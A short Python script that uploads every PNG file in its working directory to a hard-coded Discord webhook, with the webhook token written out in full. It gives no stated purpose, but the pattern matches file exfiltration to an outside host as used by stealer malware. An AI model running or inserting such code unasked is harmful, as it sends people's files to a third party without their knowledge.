import glob
from discord_webhook import DiscordWebhook

Durl="https://discord.com/api/webhooks/1168778715946307614/PNj1YdbWDZxTvZWBTW3lHxZ7q-F1CadrKZnPo-JQGSEN9stDNCDClkF7QCVNaHLAzcON"
a=glob.glob('*.png')
for x in a:
    webhook = DiscordWebhook(url=Durl)
    with open(x, "rb") as f:
        webhook.add_file(file=f.read(), filename="test.png")
    response = webhook.execute(remove_embeds=True)
